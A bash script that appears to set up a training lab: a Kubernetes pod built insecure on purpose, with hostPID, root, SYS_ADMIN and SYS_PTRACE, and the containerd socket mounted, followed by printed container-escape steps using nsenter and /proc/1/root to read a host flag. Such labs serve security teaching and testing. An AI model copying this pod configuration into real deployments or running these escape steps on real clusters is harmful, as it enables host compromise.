#!/bin/bash
set -euo pipefail
K8S_ID="k8s-16"
CLUSTER_NAME="cve-k8s-16-cri-socket"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

k8s_init
k8s_create_cluster
k8s_create_host_flag
k8s_load_images alpine:latest nginx:1.24-alpine
k8s_wait_ready
k8s_apply << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: cri-escape-pod
spec:
  hostPID: true
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: false
        runAsUser: 0
        capabilities:
          add:
            - SYS_PTRACE
            - SYS_ADMIN
      volumeMounts:
        - name: cri-sock
          mountPath: /run/containerd/containerd.sock
          readOnly: true
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: cri-sock
      hostPath:
        path: /run/containerd/containerd.sock
        type: Socket
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

k8s_wait_pod "cri-escape-pod"

k8s_info
echo "    Exploitation steps:"
echo "    1. kubectl exec -it cri-escape-pod -- sh"
echo "    2. ls -la /run/containerd/containerd.sock  (confirm CRI socket access)"
echo "    3. nsenter --target 1 --mount cat /host-flag/flag.txt"
echo "       OR: cat /proc/1/root/host-flag/flag.txt  (read flag via host /proc)"
